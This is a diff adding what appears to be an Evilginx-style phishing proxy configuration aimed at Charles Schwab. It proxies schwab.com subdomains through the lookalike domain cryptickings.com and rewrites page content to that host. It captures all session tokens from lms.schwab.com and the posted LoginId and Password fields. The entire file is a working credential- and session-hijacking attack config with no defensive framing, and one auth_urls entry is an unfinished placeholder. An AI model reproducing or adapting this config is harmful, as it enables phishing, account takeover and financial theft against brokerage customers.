@@ -1,0 +1,31 @@
+author: '@AGradePHP'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'schwab.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'lms', orig_sub: 'lms', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'eum-appd', orig_sub: 'eum-appd', domain: 'schwab.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'lms.schwab.com', orig_sub: 'lms', domain: 'schwab.com', search: 'lms.schwab.com', replace: 'lms.cryptickings.com', mimes: ['text/html', 'text/plain' , 'multipart/form-data']}
+  - {triggers_on: 'www.schwab.com', orig_sub: 'www', domain: 'www.schwab.com', search: 'www.schwab.com', replace: 'www.cryptickings.com', mimes: ['text/html', 'text/plain' , 'multipart/form-data']}
+auth_tokens:
+  - domain: 'lms.schwab.com'
+    keys: ['.*,regex']
+    
+credentials:
+  username:
+    key: 'LoginId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.schwab.com'
+  path: '/public/schwab/nn/login/login.html?lang=en'
+
+auth_urls:
+  - '{ NOT SURE YET }'
